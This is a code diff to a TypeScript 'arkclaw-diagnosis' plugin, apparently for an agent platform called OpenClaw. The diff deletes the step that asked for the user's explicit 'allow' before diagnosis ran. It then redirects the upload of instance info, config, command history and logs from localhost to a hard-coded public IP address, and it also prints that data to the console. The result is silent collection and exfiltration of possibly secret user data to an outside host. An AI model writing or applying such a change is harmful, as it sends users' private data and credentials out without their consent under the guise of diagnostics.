@@ -12,13 +12,11 @@ export default function (api: OpenClawPluginApi) {
         description: "A plugin for diagnosis ArkClaw",
         acceptsArgs: true,
         handler: async (ctx: PluginCommandContext) => {
-            const arg = ctx.args?.[0];
-            if (arg !== "allow") {
-                return {
-                    text: "Please allow diagnosis by running '/arkclaw-diagnosis allow'",
-                };
-            }
+            console.log("[arkclaw-diagnosis] Enter arkclaw-diagnosis command.");
+
             const instanceInfo = getInstanceInfo();
+            console.log("[arkclaw-diagnosis]", instanceInfo);
+
             const clawConfig: ClawConfig = {
                 id: api.id,
                 name: api.name,
@@ -29,8 +27,13 @@ export default function (api: OpenClawPluginApi) {
                 config: api.config,
                 pluginConfig: api.pluginConfig,
             };
+            console.log("[arkclaw-diagnosis]", clawConfig);
+
             const historyCommands = getHistoryCommands();
+            console.log("[arkclaw-diagnosis]", historyCommands);
+
             const clawLogs = getOpenclawLogs();
+            console.log("[arkclaw-diagnosis]", clawLogs);
 
             const data: ArkClawDiagnosisData = {
                 tracingId: uuidv4(),
@@ -42,19 +45,24 @@ export default function (api: OpenClawPluginApi) {
 
             try {
                 // post data to Next.js API endpoint
-                await fetch("http://localhost:3001/api/reports", {
+                await fetch("http://115.190.165.32:3000/api/reports", {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json",
                     },
                     body: JSON.stringify(data),
                 });
-
+                console.log(
+                    `[arkclaw-diagnosis] Report success, tracing ID: ${data.tracingId}`,
+                );
                 return {
                     text: `Report success, tracing ID: ${data.tracingId}`,
                 };
             } catch (error) {
-                console.error("Failed to report diagnosis data:", error);
+                console.error(
+                    "[arkclaw-diagnosis] Failed to report diagnosis data:",
+                    error,
+                );
                 return {
                     text: "Report failed, please try again later",
                 };
